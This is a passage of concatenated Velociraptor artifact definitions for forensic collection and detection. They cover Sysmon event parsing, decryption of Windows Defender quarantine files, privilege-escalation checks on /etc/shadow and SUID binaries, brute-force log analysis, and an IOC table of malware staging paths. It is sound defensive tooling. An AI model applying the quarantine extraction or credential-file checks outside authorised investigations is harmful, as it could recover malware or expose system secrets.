        `WIFI OUT` AS WifiOut,	
        `WIRED IN` AS WiredIn, 	
        `WIRED OUT` AS WiredOut,
        `X IN` AS _XIn,	
        `X OUT` AS _XOut,
        `ZLIVEUSAGE TABLE ID` AS LiveUsageTableID
      FROM foreach(row=NetUsageList,query=NetUsageDetails)

---END OF FILE---

======
FILE: /content/exchange/artifacts/Linux.Sysinternals.SysmonEvent.yaml
======
name: Linux.Sysinternals.SysmonEvent
description: |
  Parses syslog for Sysmon events on Linux using a unix domain socket.
  
  NOTE: This is an experimental patch for sysmon that gets it to write events 
  to a unix domain socket. 
  
  Until it merges upstream you can get it from here:
  
  **Reference**: https://github.com/Velocidex/SysmonForLinux

type: CLIENT_EVENT

precondition: SELECT OS From info() where OS = 'linux'

parameters:
  - name: SysmonUnixDomainSocket
    default: /var/run/sysmon.sock
    
sources:
  - query: |
      LET ParsedEvents = 
          SELECT parse_json(data=Data).Event AS Event 
          FROM netcat(type='unix', address=SysmonUnixDomainSocket, retry=10)
          WHERE Data
      
      SELECT timestamp(string=Event.System.TimeCreated.SystemTime) AS TimeCreated,
           Event.System.EventID AS EventID,
           Event.System.Channel AS _Channel,
           Event.System.EventRecordID AS EventRecordID,
           Event.System.EventID AS EventID,
           Event.System.Computer AS Computer,
           Event.System AS System, 
           Event.EventData AS EventData
         FROM ParsedEvents

---END OF FILE---

======
FILE: /content/exchange/artifacts/DefenderQuarantineExtract.yaml
======
name: Windows.Applications.DefenderQuarantineExtract
author: "Eduardo Mattos - @eduardfir"
description: |
   Extracts Quarantine Files from Windows Defender.

   This artifact decrypts the RC4 encrypted Windows Defender Quarantined files
   and returns information about it. If it is a PE, it also parses the PE.

   You may also choose to upload the extracted binaries for deeper malware analysis.

reference:
  - https://reversingfun.com/posts/how-to-extract-quarantine-files-from-windows-defender

type: CLIENT

parameters:
   - name: TargetGlob
     description: Target Files
     default: C:/ProgramData/Microsoft/Windows Defender/Quarantine/ResourceData/*/*
   - name: UploadDecodedFiles
     description: Select to upload decoded quarantined files.
     type: bool
   - name: DefenderRC4KeyHex
     default: "1e87781b8dbaa844ce69702c0c78b786a3f623b738f5edf9af83530fb3fc54faa21eb9cf1331fd0f0da954f687cb9e18279697900e53fb317c9cbce48e23d05371ecc15951b8f3649d7ca33ed68dc9047e82c9baad9799d0d458cb847ca9ffbe3c8a775233557dde13a8b14087cc1bc8f10f6ecdd083a959cff84a9d1d50755e3e191818af23e2293558766d2c07e25712b2ca0b535ed8f6c56ce73d24bdd0291771861a54b4c285a9a3db7aca6d224aeacd621db9f2a22ed1e9e11d75bed7dc0ecb0a8e68a2ff1263408dc808dffd164b116774cd0b9b8d05411ed6262e429ba495676b8398db2f35d3c1b9ced52636f2765e1a95cb7ca4c3ddabddbff38253"

sources:
  - query: |
        LET Targets <= SELECT Mtime, Name, FullPath FROM glob(globs=TargetGlob)

        LET DefenderRC4Key <= unhex(string=DefenderRC4KeyHex)

        LET DeQuarantine = SELECT read_file(filename=crypto_rc4(key=DefenderRC4Key, string=read_file(filename=FullPath, accessor="file")), accessor="data", offset=204) as DecodedFile,
                            Name,
                            FullPath,
                            Mtime
                           FROM Targets

        LET TempQuery = SELECT magic(path=DecodedFile, accessor="data") as Magic,
                            hash(path=DecodedFile, accessor="data") as Hash,
                            DecodedFile,
                            Name,
                            FullPath,
                            Mtime
                        FROM DeQuarantine

        SELECT
            Mtime,
            Magic,
            if(condition=Magic=~"PE", then=parse_pe(file=DecodedFile, accessor="data")) as ParsedPE,
            Hash,
            FullPath,
            if(condition=UploadDecodedFiles,
             then={
                SELECT
                upload(file=DecodedFile,
                    accessor="data",
                    name=Name + "_Defender_Quarantine_Extract.bin") as FileDetails
                FROM TempQuery
             }) as Upload
        FROM TempQuery

---END OF FILE---

======
FILE: /content/exchange/artifacts/Server.Enrichment.JsonLookup.yaml
======
name: Server.Enrichment.JsonLookup
description: Allows pulling in JSON lists from an external URL to perform lookups against
author: Whitney Champion (@shortxstack)
type: SERVER

parameters:
    - name: LookupUrl
      type: string
      default: 

sources:
  - query: |
  
        // Assumes JSON is formatted like this:
        // {
        //     "list":
        //     [
        //         {"key":"value"},
        //         {"key":"value"}
        //     ]
        // }

        LET Data = SELECT parse_json(data=Content) AS Lookup
            FROM http_client(url=LookupUrl, headers=dict(`Accept`="application/json"), method='GET')

        SELECT 
            Lookup.list AS Lookup
        FROM Data
        
        // 
        // Notebook usage:
        //
        // LET List <= SELECT Lookup from Artifact.Custom.Server.Enrichment.JsonLookup(LookupUrl="https://")
        // SELECT * FROM foreach(row=array(array=List.Lookup))
        //
        

---END OF FILE---

======
FILE: /content/exchange/artifacts/Linux.PrivilegeEscalationDetection.yaml
======
name: Linux.PrivilegeEscalationDetection
description: |
  This artifact searches for potential privilege escalation indicators on Linux systems. It identifies processes running as root that were spawned by processes not running as root, which could indicate unauthorized privilege escalation. Created by Leonardo Grossi.

type: CLIENT

precondition:
  SELECT OS FROM info() WHERE OS = 'linux'

sources:
  - name: SUIDBins
    query: |
      SELECT * FROM glob(globs="/usr/bin/*", exclude="*.txt")
      WHERE (
        Mode =~ "....s" OR
        Mode =~ "...S." OR
        Mode =~ "..s.." OR
        Mode =~ "..S..."
      )
  - name: WritableShadowFile
    query: |
      SELECT * FROM glob(globs="/etc/shadow")
      WHERE (
        Mode =~ ".....rw" OR
        Mode =~ ".....w."
      )
  - name: WritablePasswdFile
    query: |
      SELECT * FROM glob(globs="/etc/passwd")
      WHERE (
        Mode =~ ".....rw" OR
        Mode =~ ".....w."
      )
  - name: SudoersFilePermissions
    query: |
      SELECT * FROM glob(globs="/etc/sudoers")
      WHERE (
        Mode =~ "..-...r." OR
        Mode =~ "..-....r"
      )
  - name: SudoProcesses
    query: |
      SELECT * FROM pslist()
      WHERE (
        Cmdline =~ "^sudo" OR
        Cmdline =~ "^su -c sudo"
      )
  - name: ParentProcess
    query: |
      SELECT Pid, Ppid, Cmdline, Exe, Uids, Username, {
          SELECT Pid, Cmdline, Exe, Uids, Username
          FROM pslist(pid=Ppid)
      } AS Parent
      FROM pslist()
      WHERE Ppid
        AND Username =~ "root"
        AND Parent.Username != Username

---END OF FILE---

======
FILE: /content/exchange/artifacts/Linux.Detection.BruteForce.yaml
======
name: Linux.Detection.BruteForce
description: | 

   Linux detection brute force module.
   This code is based on https://github.com/RCarras/linforce/blob/main/linforce.sh
      
   This module uses btmp/wtmp files to search for possible brute force attacks comparing:
   
   * Wtmp (successful attempts) and btmp (failed attempts) Logs.
   * Time interval between failed login attempts, and against successful logins.
   
   Type of attacks:
   
   * Basic Brute Force Attack: multiple consecutive attempts from an IP.
   * Password Spraying: multiple consecutive attempts from different users with the same password.  
   * Dynamic IP Attack: multiple consecutive attempts from different IPs.

   Creators:
  
   * Rafael Carrasco: https://www.linkedin.com/in/rafael-carrasco-vilaplana-3199a492
   * David Rosado: https://www.linkedin.com/in/david-rosado-soria-4416b8230

type: client

parameters: 
   - name: "brutevar"
     description: "Number of attempts to consider as brute force"
     default: "80"
   - name: "intervalvar"
     description: "Time interval between attempts to be considered as consecutive"
     default: "45"
   - name: "min_timestamp"
     description: "Initial timestamp for the analysis in the format YYYYmmddHHMMSS"
     default: "20220901000000" 
   - name: "max_timestamp"
     description: "Maximum timestamp for the analysis in the format YYYYmmddHHMMSS"
     default: "20301231000000"
     


tools:
   - name: linforce
     url: https://raw.githubusercontent.com/RCarras/linforce/main/linforce.sh
     expected_hash: 998f65cc9f9eef746c38a165e86317e502a0915161df824ad935613e0ad74b0d
     
sources:
   - name: btmp.logs
     query: |
      -- Download tool
      LET LinforceTool <= SELECT FullPath FROM Artifact.Generic.Utils.FetchBinary(ToolName="linforce", IsExecutable=TRUE)
      
      -- Delete output after the module end
      LET outputPath <= tempdir(remove_last=TRUE)
      
      -- Execute the script as root and capture the output
      LET _ <= SELECT * FROM execve(argv=["sudo", "/bin/bash", LinforceTool.FullPath[0], "-b", brutevar, "-t", intervalvar, "-i", min_timestamp, "-m", max_timestamp, "-o", outputPath])

      -- Parse output     
      SELECT * 
      FROM split_records(filenames=outputPath+"/btmp.logs", first_row_is_headers=true)
       
   - name: wtmp.logs
     query: |
       SELECT *
       FROM split_records(filenames=outputPath+"/wtmp.logs", first_row_is_headers=true)
       
   - name: hits_login
     query: |
       SELECT * 
       FROM parse_lines(filename=outputPath+"/hits_login")
         
   - name: brute_force_attempts.log
     query: |
       SELECT * 
       FROM parse_lines(filename=outputPath+"/brute_force_attempts.log")
      
   - name: red_zone_attempts.log
     query: |
       SELECT * 
       FROM parse_lines(filename=outputPath+"/red_zone_attempts.log")

---END OF FILE---

======
FILE: /content/exchange/artifacts/Server.Notification.Mattermost.yaml
======
name: Server.Notification.Mattermost
author: Hilko Bengen <bengen@hilluzination.de>
description: |
    Send notification via Mattermost webhook as described in <https://developers.mattermost.com/integrate/webhooks/incoming/>

type: SERVER
parameters:
    - name: url
      description: Webhook URL
        
    - name: text
      description: Markdown-formatted message to display in the post.
            
    - name: channel
      description: Overrides the channel the message posts in.

    - name: username
      description: Overrides the username the message posts as.

    - name: icon_url
      description: Overrides the profile picture the message posts with.
  
    - name: icon_emoji
      description: Overrides the profile picture and icon_url parameter.

sources:
    - query: |
          LET url <= if(
              condition=url,
              then=url,
              else=server_metadata().MattermostWebhookURL)
          LET post_body <= dict(
              text=text,
              format="json")
          LET _ <= if(
              condition=channel,
              then=set(item=post_body, field="channel", value=channel))
          LET _ <= if(
              condition=username,
              then=set(item=post_body, field="username", value=username))
          LET _ <= if(
              condition=icon_url,
              then=set(item=post_body, field="icon_url", value=icon_url))
          LET _ <= if(
              condition=icon_emoji,
              then=set(item=post_body, field="icon_emoji", value=icon_emoji))
          SELECT * from http_client(
              data=serialize(item=post_body),
              headers=dict(`Content-Type`="application/json"),
              method="POST",
              url=url)

---END OF FILE---

======
FILE: /content/exchange/artifacts/Linux.Event.Network.Nethogs.yaml
======
name: Linux.Event.Network.Nethogs
author: 'Andreas Misje - @misje'
type: CLIENT_EVENT
description: |
  Monitor network use per process using the tool "nethogs". This artifact will
  list all processes that produces (non-local) network traffic on the client.
  The NetstatEnriched artifact is used to provide detailed information about the
  process using netstat and the process tracker, along with the bytes received
  and sent in bytes per second.

  Note that the tool/package "nethogs" needs to be installed before calling this
  artifact. Set the paramater InstallNethogs to true in order to automatically
  install the package and its dependencies (Debian-based systems only).

  Using techniques like stacking, rare occurances of processes contacting the
  Internet can be spotted. Notebook suggestions give you total traffic overview,
  as well as boilerplate code to plot the traffic for a selected process.

parameters:
  - name: InstallNethogs
    description: Install nethogs using apt-get
    type: bool
    default: false

  - name: NetstatCachePeriod
    description: Number of seconds to cache netstat data
    type: int
    default: 10

  - name: ProcessRegex
    description: |
      Only look for processes whose name / command line matches this regex
    type: regex
    default: .+

  - name: PIDRegex
    description: |
      Only look for processes whose PID matches this regex
    type: regex
    default: .+

  - name: UIDRegex
    description: |
      Only look for processes whose owner ID (UID) matches this regex
    type: regex
    default: .+

precondition:
  SELECT * FROM info() where OS = 'linux'

sources:
    - query: |
         LET Hoggers = SELECT Timestamp,
                              Process,
                              int(int=PID) AS PID,
                              UID,
                              parse_float(string=Sent) AS Sent,
                              parse_float(string=Recv) AS Recv
           FROM foreach(
             row={
               SELECT *
               FROM execve(argv=['/usr/sbin/nethogs', '-t', '-C'],
                           length=10000,
                           sep='\n\nRefreshing:\n')
             },
             query={
               SELECT timestamp(epoch=now()) AS Timestamp,
                      *
               FROM parse_records_with_regex(
                 accessor='data',
                 file=Stdout,
                 regex='''^\s*(?P<Process>[^\t]+)/(?P<PID>\d+)/(?P<UID>\d+)\t(?P<Sent>[^\t]+)\t(?P<Recv>\S+)''')
               WHERE Process =~ ProcessRegex
                AND PID =~ PIDRegex
                     AND UID =~ UIDRegex
             })

         LET Netstat <= memoize(
             name='netstat',
             key='Pid',
             period=NetstatCachePeriod,
             query={
               SELECT *
               FROM Artifact.Linux.Network.NetstatEnriched()
             })

         LET Result = SELECT *
           FROM foreach(
             row={
               SELECT *
               FROM Hoggers
             },
             query={
               SELECT *
               FROM foreach(
                 row={
                   SELECT 
                          dict(
                            Timestamp=Timestamp,
                            Process=Process,
                            PID=PID,
                            UID=UID,
                            Sent=Sent,
                            Recv=Recv,
                            ProcInfo=dict(
                              CommandLine=NULL,
                              Username=NULL,
                              StartTime=NULL)) + (get(
                              item=Netstat,
                              field=PID) || dict(
                              Name=NULL,
                              Laddr=NULL,
                              Lport=NULL,
                              Raddr=NULL,
                              Rport=NULL,
                              Status=NULL,
                              ProcInfo=dict(),
                              CallChain=NULL,
                              ChildrenTree=NULL)) AS Contents
                   FROM scope()
                   WHERE Contents
                 },
                 column='Contents')
             })

         // Leverage the InstallDeb utility to do the actual package install:
         LET InstallDeps = SELECT *
           FROM if(
             condition=InstallNethogs,
             then={
               SELECT *
               FROM Artifact.Linux.Utils.InstallDeb(DebName='nethogs')
             })

         SELECT *
         FROM chain(a_install=InstallDeps,
                    b_result=Result)

      notebook:
        - type: vql
          name: Traffic
          template: |
            // Modify these to adjust the time frame:
            // LET StartTime <= '2024-01-01T00:00:00Z'
            // LET EndTimeTime <= '2024-01-01T00:00:00Z'
            /*
            # Network traffic

            {{ $TimeRange := Query "SELECT StartTime, EndTime FROM scope()" | Expand }}
            Network traffic (in bytes per second) between {{ Get $TimeRange "0.StartTime" }}
            and {{ Get $TimeRange "0.EndTime" }}
            */
            LET ColumnTypes = dict(
                _ChildrenTree='tree')
            
            SELECT 
                   Timestamp,
                   PID,
                   ProcInfo.Name || Process AS Name,
                   ProcInfo.CommandLine AS CmdLine,
                   ProcInfo.Username AS Username,
                   ProcInfo.StartTime AS StartTime,
                   Laddr,
                   Lport,
                   Raddr,
                   Rport,
                   Status,
                   humanize(
                     bytes=Sent * 1024) AS Sent,
                   humanize(
                     bytes=Recv * 1024) AS Recv,
                   ProcInfo AS _ProcInfo,
                   CallChain AS _CalLChain,
                   ChildrenTree AS _ChildrenTree
            FROM source(start_time=StartTime,
                        end_time=EndTime)
            LIMIT 50

        - type: vql_suggestion
          name: Total traffic
          template: |
            // Modify these to adjust the time frame:
            // LET StartTime <= '2024-01-01T00:00:00Z'
            // LET EndTimeTime <= '2024-01-01T00:00:00Z'
            /*
            # Network traffic summary

            {{ $TimeRange := Query "SELECT StartTime, EndTime FROM scope()" | Expand }}
            This is a **rough estimate** of the total bytes sent and received between
            {{ Get $TimeRange "0.StartTime" }} and {{ Get $TimeRange "0.EndTime" }}.
            */
            LET Summary = SELECT 
                     PID,
                     ProcInfo.Name || Process AS Name,
                     ProcInfo.CommandLine AS CommandLine,
                     ProcInfo.Username AS Username,
                     ProcInfo.StartTime AS StartTime,
                     // nethogs -t outputs a data rate every second. Adding these
                     // values give us a rough estimate of the data transferred
                     sum(
                       item=Sent * 1024) AS Sent,
                     sum(
                       item=Recv * 1024) AS Recv
              FROM source(start_time=StartTime,
                          end_time=EndTime)
              GROUP BY PID, Name
            
            SELECT *,
                   humanize(
                     bytes=Sent) AS Sent,
                   humanize(
                     bytes=Recv) AS Recv,
                   humanize(
                     bytes=Recv + Sent) AS Total
            FROM Summary
            LIMIT 50

        - type: vql_suggestion
          name: Plot traffic for PID
          template: |
            // Modify these to adjust the time frame:
            // LET StartTime <= '2024-01-01T00:00:00Z'
            // LET EndTimeTime <= '2024-01-01T00:00:00Z'
            // The process whose traffic to plot:
            LET PIDTarget = 1234

            /*
            {{ $Vars := Query "SELECT PIDTarget, StartTime, EndTime FROM scope()" | Expand }}
            # Network traffic for PID {{ Get $Vars "0.PIDTarget" }}

            Network traffic (in bytes per second) between {{ Get $Vars "0.StartTime" }}
            and {{ Get $Vars "0.EndTime" }}
            */
            LET SinglePSStats = SELECT 
                                       Timestamp.Unix AS Timestamp,
                                       Sent * 1024 AS Sent,
                                       Recv * 1024 AS Recv
              FROM source(start_time=StartTime,
                          end_time=EndTime)
              WHERE PID = PIDTarget
              LIMIT 50

            /*
            {{ Query "SELECT * FROM SinglePSStats" | TimeChart }}
            */

            // We do not really need this, but we need to execute some VQL
            // in order for the plot to appear:
            SELECT *
            FROM SinglePSStats
---END OF FILE---

======
FILE: /content/exchange/artifacts/bulkfile.yaml
======
name: Windows.Bulk.File
author: Matt Green - @mgreen27
description: |
    Search for some simple bulk File IOCs and upload if desired.
    Typical upload workflow may be to firstly search, then if returned
    rows match expectations rerun query with upload tickbox selected.

    NOTE: strings with comma "," requre quotes.

    IocLookupTable csv details:

    Glob - "Quote" items with { glob } barckets.
    Whitelist - Velociraptor regex to whitelist FullPath field.
    Description - Free text

parameters:
  - name: UploadHits
    description: Upload hits to server.
    type: bool
  - name: Accessor
    type: choices
    default: auto
    choices:
      - auto
      - ntfs
      - file
  - name: IocLookupTable
    type: csv
    default: |
        TargetGlob,IgnoreRegex,Description
        "C:\intel\Logs\*.{ps1,vbs,js,exe,dll,bat,cpl}",,Carbanak staging location
        "C:\users\public\temp\*.{ps1,vbs,js,exe,dll,bat,cpl}",,Carbanak staging location
        "C:\Windows\SystemApps\*\*.{ps1,vbs,js,bat,cpl}",,Carbanak staging location
        "C:\windows\temp\temp1\*.{ps1,vbs,js,exe,dll,bat,cpl}",,Carbanak staging location
        "C:\Windows\System32\spool*\*.{ps1,vbs,js,bat,cpl}",,Common staging location
        "C:\Perflogs\**\*.{lnk,ps1,vbs,js,exe,dll,bat,cpl,zip,7z,rar}",\.(ini|txt|zip|etl|html|xml|xsl|log|blg)$,Staging location
        "C:\ProgramData\*.{ps1,vbs,js,exe,dll,bat,cpl}",,Staging location
        "C:\ProgramData\.*\*.{bin,dat,txt,log,ps1,vbs,js,exe,dll,bat,cpl}",,Copy-Paste staging location
        "C:\Users\Public\**\*.{lnk,ps1,vbs,js,exe,dll,bat,cpl,zip,7z,rar}",C:\\Users\\Public\\Desktop\\[\\]+\.lnk,Staging location
        "C:\Users\*\Sounds\*.{ps1,vbs,js,exe,dll,bat,cpl}",,Investigation staging
        "C:\Windows\Temp\winsyslog\*.{ps1,vbs,js,exe,dll,bat,cpl}",,Current investigation X1002
        "C:\Windows\Help\*.{ps1,vbs,js,exe,dll,bat,cpl}",,Staging location
        "C:\Windows\twain_32\*.{ps1,vbs,js,exe,dll,bat,cpl}",,Staging location

sources:
  - precondition:
      SELECT OS From info() where OS = 'windows'

    query: |
      -- extract IOCs from lookupTable
      LET hits = SELECT * FROM foreach(
            row=IocLookupTable,
            query={
                SELECT
                    OSPath,
                    Name,
                    dict(
                        TargetGlob=TargetGlob,
                        IgnoreRegex=IgnoreRegex,
                        Description=Description
                            ) as IocDetails,
                    timestamp(epoch=Mtime) as Mtime,
                    timestamp(epoch=Atime) as Atime,
                    timestamp(epoch=Ctime) as Ctime,
                    timestamp(epoch=Btime) as Btime,
                    Size,
                    IsLink
                FROM glob(globs=TargetGlob,accessor=Accessor)
                WHERE NOT IsDir
                    AND NOT if(condition=IgnoreRegex,
                        then=OSPath =~ IgnoreRegex,
                        else=FALSE)
            })

      -- upload hits
      LET upload_hits = SELECT *, upload(file=OSPath) FROM hits

      -- output rows
      SELECT *,
        hash(path=OSPath) as Hash
      FROM if(condition=UploadHits,
            then= upload_hits,
            else= hits)

---END OF FILE---

======
FILE: /content/exchange/artifacts/MacOS.Applications.Safari.Downloads.yaml
======
name: MacOS.Applications.Safari.Downloads
description: |
  Parses Safari downloads for all standard macOS users
  
  **NOTE**: By default Safari download history is only retained for 24 hours

author: Deepak Sharma - @rxurien

type: CLIENT

precondition: SELECT OS From info() where OS = 'darwin'

parameters:
  - name: DownloadsPath
    default: /Users/*/Library/Safari/Downloads.plist
  - name: UserRegex
    default: .
  - name: UploadFile
    description: Upload Downloads.plist File
    type: bool

sources:
  - name: Downloads
    query: |
      LET DownloadsGlob = SELECT
         parse_string_with_regex(regex="/Users/(?P<User>[^/]+)", string=FullPath).User AS User,
         FullPath, Mtime, plist(file=FullPath) AS Content from glob(globs=DownloadsPath)
    
      SELECT * FROM foreach(row=DownloadsGlob, 
        query={
          SELECT * FROM foreach(row=Content.DownloadHistory, query={SELECT DownloadEntryDateAddedKey AS StartTime, DownloadEntryDateFinishedKey AS EndTime, User, DownloadEntryPath AS DownloadPath, DownloadEntryURL AS URL, DownloadEntryProgressBytesSoFar AS BytesDownloaded, DownloadEntryProgressTotalToLoad AS BytesTotal, DownloadEntryRemoveWhenDoneKey AS IncognitoDownload, FullPath AS FilePath from scope()})
          })
            
  - name: Upload
    query: |
      SELECT * FROM if(condition=UploadFile,
        then={
          SELECT User, FullPath AS FilePath,
               upload(file=FullPath) AS FileDetails 
          FROM DownloadsGlob
        })

---END OF FILE---

======
FILE: /content/exchange/artifacts/Docker.Image.Export.yaml
======
name: Docker.Image.Export
author: Brady Semm - @btsemm / DoppioRistretto
description: |
    Uses the Docker UNIX socket to export a Docker image to a
    tempfile and upload to Velociraptor.
    
    Analysis Tips:  
        - https://jellyparks.com/posts/compromised-container-analysis-primer/

    #docker
    
parameters:
  - name: dockerSocket
    description: |
      Docker server socket. You will normally need to be root to connect.
    default: /var/run/docker.sock
  - name: ImageNameOrID
    description: |
      Docker Image name or ID to export. Can include tag (eg. "image:latest")
    default: empty

sources:
  - precondition: |
      SELECT OS From info() where OS = 'darwin' OR OS = 'linux'
    query: |

        LET EncodedImageNameOrID = regex_replace(source=ImageNameOrID, replace_lambda="x=>format(format='%%%02x',args=x)", re="[^a-z0-9\\-_.~?]")
        LET docker_api_path = format(format="%v:unix/images/%v/get", args=[dockerSocket, EncodedImageNameOrID])
        LET response <= SELECT Content FROM http_client(url=docker_api_path, tempfile_extension=".tar", remove_last=true)
        
        SELECT upload(file=response.Content) from scope()

        

---END OF FILE---

======
FILE: /content/exchange/artifacts/HVCI.yaml
======
name: Windows.Registry.HVCI
author: Matt Green - @mgreen27
description: |
    This artifact will return the Enabled KeyValue in the Hypervisor-protected Code 
    Integrity (HVCI) registry path. An adversary may set the Enabled key to 0 
    if they intend to manipulate UEFI boot process.
    
    The artifact will group by KeyName, KeyValue and KeyType to account for 
    multiple control sets.

reference:
  - https://www.microsoft.com/en-us/security/blog/2023/04/11/guidance-for-investigating-attacks-using-cve-2022-21894-the-blacklotus-campaign/
  - https://learn.microsoft.com/en-us/windows/security/hardware-security/enable-virtualization-based-protection-of-code-integrity

parameters:
 - name: KeyGlob
   default: HKEY_LOCAL_MACHINE\SYSTEM\*ControlSet*\Control\DeviceGuard\Scenarios\HypervisorEnforcedCodeIntegrity\**
 - name: OnlyShowZero
   type: bool
   description: If this is set, the results will only show KeyValues = 0

sources:
  - precondition:
      SELECT OS From info() where OS = 'windows'

    query: |
      SELECT 
        Mtime, 
        OSPath,
        Data.type as KeyType,
        Name as KeyName,
        Data.value as KeyValue
      FROM glob(globs=KeyGlob, accessor="registry")
      WHERE KeyName = 'Enabled'
        AND if(condition= OnlyShowZero,
                then= KeyValue = 0,
                else= True )
      GROUP BY KeyName, KeyValue, KeyType

---END OF FILE---

======
FILE: /content/exchange/artifacts/Windows.Forensics.AdvancedPortScanner.yaml
======
name: Windows.Forensics.AdvancedPortScanner

description: |
 This Velociraptor artifact is tailored for forensics analysis of Angry IP Scanner usage on Windows platforms. This facilitates the identification of how Angry IP Scanner was configured and used, aiding in DFIR investigations. It examines registry keys HKEY_USERS\\*\\SOFTWARE\\Famatech\\advanced_port_scanner and HKEY_USERS\\*\\SOFTWARE\\Famatech\\advanced_port_scanner\\State for retrieve some informations about:
    
 - run: Displays the version of Advanced Port Scanner
 - locale_timestamp: Indicates the time in EPOCH (UTC +0) at which the application was first launched
 - locale: Displays the language chosen for the graphical interface, may prove useful to have an idea of the native language of a threat actor (it is necessary to correlate with a modus operandi in order not to fall into the trap of a false flag)
 - LastPortsUsed: Displays the last ports used in the last scan
 - LastRangeUsed: Displays the last IP range used in the last scan
 - IpRangesMruList: Displays all the IP ranges scanned by the tool, the first digit of each prefix in this list indicates the frequency of scans for each range
 - PortsMruList: Displays all the ports that have been scanned by the tool, the first digit of each prefix in this list indicates the frequency of scans for each port
 - SearchMruList: Displays all the IP addresses or hostnames that have been searched using the GUI's "search" feature

author: Julien Houry - @y0sh1mitsu (CSIRT Airbus Protect)

reference:
 
 - https://www.protect.airbus.com/blog/uncovering-cyber-intruders-a-forensic-deep-dive-into-netscan-angry-ip-scanner-and-advanced-port-scanner/
 - https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-136a
 - https://thedfirreport.com/2021/01/18/all-that-for-a-coinminer/

type: CLIENT

parameters:
    - name: RegistryPath_APS
      default: HKEY_USERS\\*\\SOFTWARE\\Famatech\\advanced_port_scanner
      type: hidden
    - name: RegistryPath_State
      default: HKEY_USERS\\*\\SOFTWARE\\Famatech\\advanced_port_scanner\\State
      type: hidden
    - name: RegistryData
      type: regex
      default: .

sources:

- name: AdvancedPortScanner
  query: | 
    SELECT Key.FileInfo.FullPath AS FullPath, Key.FileInfo.ModTime AS ModificationTime, run, locale, locale_timestamp
    FROM read_reg_key(globs=RegistryPath_APS, accessor="registry") WHERE Key.FileInfo.FullPath =~ RegistryData
    
- name: State
  query: |
     SELECT Key.FileInfo.FullPath AS FullPath, Key.FileInfo.ModTime AS ModificationTime, LastPortsUsed, LastRangeUsed, IpRangesMruList, PortsMruList, SearchMruList
      FROM read_reg_key(globs=RegistryPath_State, accessor="registry") WHERE Key.FileInfo.FullPath =~ RegistryData

---END OF FILE---

======
FILE: /content/exchange/artifacts/Linux.LogAnalysis.ChopChopGo.yaml
======
name: Linux.LogAnalysis.ChopChopGo
description: |

    This artifact leverages ChopChopGo to enable usage of Sigma rules to faciliate detection within Linux logs.
    
    From the project's description:
    
    `ChopChopGo inspired by Chainsaw utilizes Sigma rules for forensics artifact recovery, enabling rapid and comprehensive analysis of logs and other artifacts to identify potential security incidents and threats on Linux.`
    
reference:
  - https://github.com/M00NLIG7/ChopChopGo

author: Wes Lambert - @therealwlambert, @weslambert@infosec.exchange
tools:
  - name: ChopChopGo
    url: https://github.com/M00NLIG7/ChopChopGo/releases/download/v1.0.0-beta-3/ChopChopGo_v1.0.0-beta-3.zip
    
precondition: SELECT OS From info() where OS = 'linux'

parameters:  
  - name: ExecLength
    description: Size (in bytes) of output that will be returned for a single row for execve().  This value may need to be adjusted depending on the size of your event logs.
    type: int
    default: "100000000"
  
  - name: Rules
    description: Sigma rules to use for detection 
    type: string
    default: /ChopChopGo/rules/linux/builtin/syslog/
    
  - name: Target 
    description: Refers to the type of data you woud like to analyze. For example, `journald` or `syslog`.
    type: string
    default: syslog
    
sources:
  - query: |
        LET Toolzip <= SELECT FullPath FROM Artifact.Generic.Utils.FetchBinary(ToolName="ChopChopGo", IsExecutable=FALSE)
        LET TmpDir <= tempdir()
        LET TmpResults <= tempfile()
        LET UnzipIt <= SELECT * FROM unzip(filename=Toolzip.FullPath, output_directory=TmpDir)
        LET SigmaRules <= TmpDir + Rules
        LET ExecCCG <= SELECT * FROM execve(argv=[
                        TmpDir + '/ChopChopGo/ChopChopGo',
                        "-rules", SigmaRules,
                        "-target", Target,
                        "-out", "json"], length=ExecLength)
        SELECT *
        FROM foreach(
            row=ExecCCG, 
             query={
                SELECT 
                    Timestamp,
                    Title,
                    Message AS Message,
                    Tags,
                    Author,
                    ID
                FROM parse_json_array(data=Stdout)})

---END OF FILE---

======
FILE: /content/exchange/artifacts/Splunk.Events.Clients.yaml
======
name: Splunk.Events.Clients
author: "@jurelou, Modified By @SilverKnightKMA"
description: |
  This server monitoring artifact will watch a selection of client
  monitoring artifacts for new events and push those to a splunk
  index.

  NOTE: You must ensure you are collecting these artifacts from the
  clients by adding them to the "Client Events" GUI.

  To configure the event collector properly a couple steps need to be
  completed prior to setting up this event:
    1. Configure an index to ingest the data.
       * Go to Settings > Index.
       * New Index.
    2. Configure the collector.
       * Go to Settings > Data Inputs > HTTP Event Collector.
       * Add New.
       * Name does not matter, but ensure indexer acknowledgement is OFF.
       * Set `Selected Indexes` to the index configured in step 1.
       * Save API key for this event.
    3. Set Global settings.
       * Go to Settings > Data Inputs > HTTP Event Collector > Global Settings
       * Ensure `All Tokens` is set to ENABLED
       * Copy the HTTP Port Number for this event
    4. Configure your Splunk props.conf and tranforms.conf
       * Add the following to props.conf
        [vql]
        INDEXED_EXTRACTIONS = json
        DATETIME_CONFIG = CURRENT
        TZ = GMT
        category = Custom
        pulldown_type = 1
        TRANSFORMS-vql-sourcetype = vql-sourcetype,vql-timestamp
        TRUNCATE = 512000
        KV_MODE = none
        AUTO_KV_JSON = false
       * Add the following to transforms.conf
        [vql-sourcetype]
        INGEST_EVAL = sourcetype=lower(src_artifact)
        [vql-timestamp]
        INGEST_EVAL = _time=case( \
                      src_artifact="artifact_Linux_Search_FileFinder",strptime(CTime,"%Y-%m-%dT%H:%M:%SZ"), \
                      src_artifact="artifact_System_VFS_ListDirectory",strptime(ctime,"%Y-%m-%dT%H:%M:%S.%NZ"), \
                      src_artifact="artifact_Windows_Timeline_MFT",strptime(event_time,"%Y-%m-%dT%H:%M:%S.%NZ"), \
                      src_artifact="artifact_Windows_NTFS_MFT",strptime(Created0x10,"%Y-%m-%dT%H:%M:%S.%NZ"), \
                      src_artifact="artifact_Windows_EventLogs_Evtx",strptime(TimeCreated,"%Y-%m-%dT%H:%M:%SZ"), \
                      src_artifact="artifact_Custom_Windows_EventLogs_System_7045",strptime(TimeCreated,"%Y-%m-%dT%H:%M:%SZ"), \
                      src_artifact="artifact_Windows_EventLogs_RDPAuth",strptime(EventTime,"%Y-%m-%dT%H:%M:%SZ"), \
                      src_artifact="artifact_Windows_Analysis_EvidenceOfExecution_UserAssist",strptime(LastExecution,"%Y-%m-%dT%H:%M:%SZ"), \
